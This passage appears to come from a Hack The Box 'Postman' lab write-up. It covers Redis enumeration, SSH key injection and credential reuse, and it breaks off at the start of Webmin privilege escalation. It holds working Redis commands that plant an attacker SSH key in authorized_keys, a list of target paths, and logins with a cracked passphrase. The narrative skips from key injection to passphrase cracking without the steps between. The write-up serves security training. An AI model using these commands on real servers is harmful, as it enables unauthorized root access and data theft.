### Web Enumeration

The website on port 80 appeared to be a static personal page. There were no obvious forms, login panels, or dynamic features to attack, so I moved on to Redis.

The important detail is that Redis allowed `CONFIG GET dir`, confirming that I could interact with the server without credentials. When Redis is exposed this way, one common attack is to write an attacker-controlled SSH public key into an `authorized_keys` file, then authenticate over SSH as the user running Redis.

### SSH Key Injection

I used the Redis SSH key injection technique documented [here](https://hackviser.com/tactics/pentesting/services/redis#ssh-key-injection). The idea is to store a public key inside Redis, point Redis at a writable `.ssh` directory, set the database filename to `authorized_keys`, and force Redis to save the database to disk.

```bash
# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Prepare key with newlines
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Inject into authorized_keys
redis-cli -h target.com flushall
cat key.txt | redis-cli -h target.com -x set ssh_key
redis-cli -h target.com config set dbfilename authorized_keys
redis-cli -h target.com config set dir /root/.ssh
redis-cli -h target.com save

# Alternative paths
/home/redis/.ssh/authorized_keys
/home/ubuntu/.ssh/authorized_keys
/var/lib/redis/.ssh/authorized_keys

# Connect via SSH
ssh -i redis_key root@target.com
```


> **Note:** I tested the common writable locations until `/var/lib/redis/.ssh` worked. On this box, I first had to set the Redis directory to `/var/lib/redis`, then set `dbfilename` to `authorized_keys`, and finally run `save`.

John recovered the passphrase `computer2008`. I fixed the local file permissions and tried to use the key for SSH as `Matt`.

```bash
┌─[tr3m0x@parrot]─[~/htb/linux/postman]
└──╼ $chmod 600 id_rsa.bak
```

The server immediately closed the connection, so I checked the SSH daemon configuration from the existing `redis` shell.

```bash
redis@Postman:~$ cat  /etc/ssh/sshd_config
<SNIP>
#deny users
DenyUsers Matt
<SNIP>
```

`Matt` was explicitly denied SSH access through `DenyUsers`, so the private key was not useful for direct login. However, the recovered key passphrase was also reused as Matt's system password, which allowed switching users locally.

```bash
redis@Postman:/tmp$ su Matt
Password:
Matt@Postman:/tmp$ 
```

At this point I had an interactive shell as `Matt`.

## Privilege Escalation

### Webmin Service

I checked processes running as root and confirmed that the Webmin service from the initial Nmap scan was running with root privileges.

```bash
Matt@Postman:/etc/webmin$ ps auxww | grep root
<SNIP>
root        777  0.0  3.1  90940 28872 ?        Ss   07:49   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
<SNIP>
```

Webmin's MiniServ process was running as root, so compromising Webmin would likely provide root code execution. The exposed version was Webmin `1.910`, which is affected by **CVE-2019-12840**, an authenticated remote command execution vulnerability in the Package Updates module.

![webadmin](/assets/img/posts/postman/webadmin.png)

The vulnerability requires valid Webmin credentials. I tested the reused credentials `Matt:computer2008`, and they successfully logged in to the Webmin dashboard.

![dashboard](/assets/img/posts/postman/dashboard.png)
